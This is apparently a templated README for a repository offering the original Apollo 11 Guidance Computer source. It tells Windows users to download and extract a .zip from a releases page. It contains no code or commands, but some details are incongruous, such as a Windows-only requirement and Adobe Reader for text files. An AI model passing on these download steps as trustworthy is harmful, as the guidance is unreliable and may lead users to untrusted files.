🚀 Apollo-11 - Inspect Historic Apollo Guidance Computer Source

Download Apollo-11 Files

📖 About This Project

This repository contains the original source code for the Apollo 11 Guidance Computer. Engineers at MIT developed this software to help the command and lunar modules navigate to the moon and back. You can view the logic that allowed humans to land on the lunar surface. The code displays the instructions given to the computer during the historic 1969 mission.

💻 System Requirements

To view the files, your computer needs the following:

  • A Windows 10 or Windows 11 operating system.
  • Adobe Reader or a modern web browser to open text files.
  • At least 50 megabytes of free storage space.

⬇️ Setup and Installation

Follow these steps to access the documents on your computer.

  1. Visit the official releases page to begin the download.
  2. Look for the section labeled "Assets."
  3. Click the file ending in .zip to start your download.
  4. Find the file in your Downloads folder after it finishes.
  5. Right-click the folder and select "Extract All."
  6. Choose a location for these files and select "Extract."
  7. Open the extracted folder to view the source code documents.

✨ Key Features

This project provides raw access to the foundational computing work of the twentieth century. Users can explore:

  • Full guidance code for the Command Module.
  • Lunar Module navigation algorithms.
  • Notes from the original software developers.
  • Clear documentation of mission-critical math.

🛠️ Troubleshooting

If you have issues opening the code, verify your file extract process. Ensure you have a program installed to read text files. Most computers come with Notepad, which works well for these documents. If the text appears messy, try opening the files inside a modern web browser like Chrome or Edge.
